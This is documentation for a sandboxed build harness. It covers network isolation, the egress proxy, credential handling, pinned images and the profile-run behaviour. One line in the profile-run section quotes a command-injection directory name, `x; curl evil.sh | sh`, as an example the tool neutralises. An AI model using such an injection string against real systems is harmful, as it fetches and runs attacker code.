# hodei-meta-harness: language profiles (Rust / JVM)

Reproducible build profiles for hodei-meta-harness. Everything runs inside an
OpenSandbox sandbox; there is NO native (host) execution fallback. If the
sandbox, the pinned image or the restricted egress path is unavailable, the
tool informs you and refuses.

This document describes what the tool **measures**. Every claim below has a
counterpart in the run record or in a probe check; nothing here is asserted
without evidence.

## Prerequisites (clean host)

1. Docker with support for an internal bridge using IPv4 gateway mode
   `isolated`. The lifecycle server validates each network and refuses to
   create the sandbox if the backend cannot enforce it.
2. A Rust toolchain to build the harness itself: cargo ≥ 1.96 (the shipped
   `rust` profile runs cargo 1.100.0 inside its own image).

   The build is STANDALONE by default: `.cargo/config.toml` links the
   binaries statically, so they need no glibc, no libgcc and no other
   system library from the host. The binaries land in
   `$BIN` = `target/x86_64-unknown-linux-gnu/release` (the triple is
   explicit because the static flags must not reach the proc-macros).
3. A restricted egress proxy running in a Docker container, configured via
   `HODEI_MH_EGRESS_PROXY_CONTAINER`. The lifecycle server creates a separate
   internal bridge for each sandbox, requiring IPv4 gateway mode `isolated`
   and IPv6 disabled, and attaches the configured proxy using the Docker DNS
   alias `hodei-proxy`. A backend that cannot provide this mode is unsupported.
   The operator must configure the proxy to permit clients from Docker's
   sandbox address pools: the shipped proxy accepts `172.16.0.0/12`, which
   covers every pool Docker allocates from (`172.17`–`172.31`), and refuses
   a broader prefix. The probe lane uses the configured proxy and does
   not create or remove it.

   Configure `HODEI_MH_PROXY_URL` to the proxy address reachable from the
   sandbox (for example `http://hodei-proxy:8888`) and
   `HODEI_MH_PROXY_CHECK_URL` to its host-side address. Before a profile build,
   the client checks proxy reachability and checks that direct internet access
   is blocked. These observations do not authenticate the proxy or prove
   isolation from every possible destination: operators must provision and
   trust the proxy and its network connections.
4. Credentials, if the workload needs them, in the environment of the
   process that needs them (`ANTHROPIC_AUTH_TOKEN`, ...). They are never
   written to disk, logs, state or snapshots.

## Install

```bash
git clone https://github.com/Rubentxu/hodei-meta-harness
cd hodei-meta-harness
cargo build --release -p hodei-mh-lifecycle-server -p hodei-mh
BIN=target/x86_64-unknown-linux-gnu/release
```

The result is a statically linked binary: `ldd` reports "statically
linked" and it runs on a distro whose glibc is older than the build
host's. `hodei-mh package` REFUSES to build a bundle from binaries that
carry a dynamic loader — the distribution is standalone or it is not
published.

The bundle is assembled from the **release** profile, never from a debug
build, and it is named after the platform the binaries were COMPILED for
(`x86_64-unknown-linux-gnu`), not after the machine that happens to run
the packaging command. `hodei-mh package` checks the architecture of the
binaries it stages against that name and refuses a mismatch: a mislabeled
artifact is worse than no artifact.

The documentation the bundle ships comes from a TRUSTED source: the copy
installed next to the running binary
(`<prefix>/share/hodei-mh/docs/profiles.md`), or the copy of the workspace
that owns the product. A file named `docs/profiles.md` that merely happens
to sit in the working directory is NOT the product's documentation, and
shipping it would put a foreign text inside the release; `hodei-mh package`
refuses to build a bundle when neither trusted source exists, and the
manifest states the origin and the SHA-256 of the document it shipped.

The bundle also carries `SHA256SUMS`: the digests of every file it ships,
read from the staged bytes. A consumer can verify the unpacked bundle
offline, with no network and no repository:

```bash
LC_ALL=C sha256sum -c SHA256SUMS
```

Versions are pinned by the workspace (`Cargo.toml`): no floating
dependencies are used at runtime.

## Start the control plane

```bash
# Set a secret shared by the lifecycle server and its authorized clients.
export HODEI_MH_CONTROL_TOKEN="$(openssl rand -hex 32)"
# Name or ID of the operator-provisioned restricted proxy container.
export HODEI_MH_EGRESS_PROXY_CONTAINER="your-proxy-container"
export HODEI_MH_PROXY_URL="http://hodei-proxy:8888"
export HODEI_MH_PROXY_CHECK_URL="http://127.0.0.1:8888"
PORT=8081 $BIN/hodei-mh-lifecycle-server &
$BIN/hodei-mh supervisor --socket /tmp/hodei-mh-supervisor.sock --project hodei-mh &
```

The lifecycle HTTP listener accepts loopback hosts only; do not expose its
bearer credential over an unprotected network. Sandbox ports are not published:
a per-sandbox loopback relay carries the traffic to the execd. The relay has
NO credential of its own — the barrier is the execd's own per-sandbox
credential, which the control plane hands over in the endpoint contract and
which the execd demands in the `X-EXECD-ACCESS-TOKEN` header.

One supervisor per project, enforced by the socket itself: starting a
second supervisor on a LIVE socket is refused (`a supervisor is already
listening on ...`), so the state can never split in two. A socket left by a
crashed supervisor is stale and IS taken over. The CLI and the TUI are
clients of the same socket (`sup-status`,
`sup-action start|pause|resume|stop|renew`, `tui`).

The supervisor serves ONE project: a `Start` naming a different project is
refused with `project mismatch`, and the snapshot states the grant's effect
scope explicitly (the supervisor authorizes no effect by itself).

## The trust boundary

Every sandbox runs in a network of its own, and the boundary is verified
before the sandbox is reported as usable. The properties below are not
aspirational: each one is checked by the control plane (which fails closed)
or measured from inside the sandbox by `hodei-mh trust-probe`.

**The network of a sandbox.** One internal bridge per sandbox, created and
verified by the server:

- `internal=true`: the bridge has no route to the outside.
- `enable_ipv6=false`: no second way out.
- `com.docker.network.bridge.gateway_mode_ipv4=isolated`: the bridge gateway
  does not forward for the sandbox, and the sandbox has no default route at
  all (measured from inside: `/proc/net/route` carries no default).
- The subnet is allocated by Docker from the `172.17.0.0/16`–`172.31.0.0/16`
  pools, so a sandbox never shares a subnet with the host's default bridge.
- The container is attached to that network ALONE, and the server reads the
  attachment back: a container attached somewhere else fails the creation.
- `NET_ADMIN` and `NET_RAW` are dropped, so the sandbox cannot add a route
  of its own.

**The egress path.** The operator's proxy is attached to the sandbox's
bridge by its immutable container id, under the DNS alias `hodei-proxy`.
The sandbox reaches the internet ONLY through that proxy, and the proxy
speaks HTTPS `CONNECT` to an exact allow-list of destinations, validating
every DNS answer and refusing any answer that is not a global address. The
proxy's client ACL must cover the pools Docker allocates from
(`172.16.0.0/12`); a prefix broader than a /12 is refused, because a proxy
that accepts the whole address space is an open relay for the host. The
proxy also accounts for the tunnels it has open: a sandbox that opens
tunnels without limit would take the egress of every other sandbox with it.

**The execution plane.** The execd listens on `0.0.0.0:44772` of the
sandbox's own network, so it is reachable from INSIDE the sandbox — the
network is not the barrier. The barrier is the credential: the server mints
one per sandbox, injects it into the container's environment, and hands it
over in the endpoint contract of that sandbox only. The execd refuses a
request with a missing, wrong or foreign credential, and it refuses one
from inside the sandbox as well (measured: `401`).

**The environment belongs to the operator.** The environment of the sandbox
is read by the execd, so the server owns it:

- The operator's variables win over the request's, always.
- A request may NOT write into the `EXECD_` or `OPENSANDBOX_` namespaces:
  the execd takes its configuration from there.
- The credential and the identity of the sandbox belong to the server. The
  credential is read back from the container by EXACT name, and an
  environment entry that merely starts with the same name is not the
  credential — a request cannot choose the credential the server hands out.

**What the server verifies before answering a create.** The attachment of
the container to its network, the applied resource limits and the real state
of the container. A sandbox whose isolation could not be established is a
failure, not a sandbox that reports itself as running.

## Doctor (strictly non-destructive)

```bash
$BIN/hodei-mh doctor --profile rust
$BIN/hodei-mh doctor --profile jvm
```

Checks (all read-only): profile pinned, local image digest vs pinned digest,
restricted-egress reachability, lifecycle API readiness, subscription
limitations. NEVER creates, starts or removes anything — the probe compares
the sandbox list before and after the doctor and requires it to be
unchanged.

Two checks are reported but do NOT block:

- `profile-pinned`: a user image without a digest is reported as NOT
  pinned. A user image that is present locally is accepted; one that is
  absent is refused.
- `sandbox-egress-isolation`: the host-side check cannot prove what a
  sandbox may reach, so this check reports **unknown**, not a pass. The
  measurement from inside a sandbox happens during `profile-run`.

## Shipped profiles (fixed versions)

| profile | image | digest (sha256) | toolchain |
| --- | --- | --- | --- |
| rust | `rust:1-bookworm` | `sha256:ade39a710ef85f3506cffcfec3e8a24ba090badef1dff2fb798f71d878833fea` | cargo 1.100.0 |
| jvm | `opensandbox/code-interpreter:v1.1.0` | `sha256:133a3c1720dd52291a019740c2987e7164ea6de79e23d8198798e58950ae2e6e` | javac/java 21.0.11 |

User images are accepted with `--image URI`; an unpinned user image is
reported as such (reproducibility then depends on the registry tag). The
record carries BOTH the requested pin (`image_sha_requested`) and the digest
observed for the image that actually ran (`image_digest_observed`).

## Run a profile build

```bash
$BIN/hodei-mh profile-run --profile rust --project /path/to/project --cpu 1 --memory 1Gi
$BIN/hodei-mh profile-run --profile jvm  --project /path/to/project --cpu 1 --memory 1Gi
```

Behavior:

- Gates through the doctor; if anything required is missing the run REFUSES
  (exit 1) and prints the missing pieces. `yolo_fallback: false` and
  `build_executed_on_host: false` — there is no native execution path.
- Creates a sandbox with the PINNED image and the REQUESTED limits, then
  reports the OBSERVED limits from inside (cgroups).
- Waits (BOUNDED, 60 s) for the sandbox's `execd` to start answering
  through its loopback control relay before running the workload. The wait
  uses a harmless probe, so the real command runs EXACTLY ONCE — a
  command that ran and failed is never repeated. A sandbox that never
  becomes usable is a failure (exit 1), not an endless wait.
- The output of every command is drained completely: the execd flushes
  the PTY buffer AFTER the exit frame, so a short window is kept open
  after it. Without that, a short command can lose its whole output and
  the record would carry a measurement that never happened.
- The create carries a `request-tag`. If the response is lost, the effect
  is RECONCILED by that tag before any retry: an existing sandbox is
  adopted, never duplicated. A failed tag search ABORTS the run (it never
  licenses a second sandbox).
- Caches live in `/workspace/.cache/hodei-mh/<profile>/<hash-of-project-path>`
  inside the sandbox: the token is a sha256 of the project's CANONICAL
  absolute path, so two projects can never share cache state, and the same
  project reached by two relative paths still resolves to one cache.
- The project directory name is sanitized (`[A-Za-z0-9._-]`) and every path
  is shell-quoted: a directory named `x; curl evil.sh | sh` is inert data.
- Build commands carry no credentials; the leak detector runs over the
  EXACT strings that were executed, and the build output is redacted before
  it reaches the record.
- The record includes the sandbox id, the request tag, the cleanup result,
  the observed image digest, the exact commands and their outcomes (this is
  the artifact you archive per build).

## Global environment budget

The lifecycle server can enforce a global budget of concurrent environments:

```bash
MAX_CONCURRENT_ENVIRONMENTS=2 PORT=8081 $BIN/hodei-mh-lifecycle-server
```

When the budget is exhausted the create is REFUSED with
`429 SANDBOX::BUDGET_EXHAUSTED` and NO environment is created — the caller
must wait. The limit lives in the server's create path, so it bounds every
client, not only the ones that keep a local ledger.
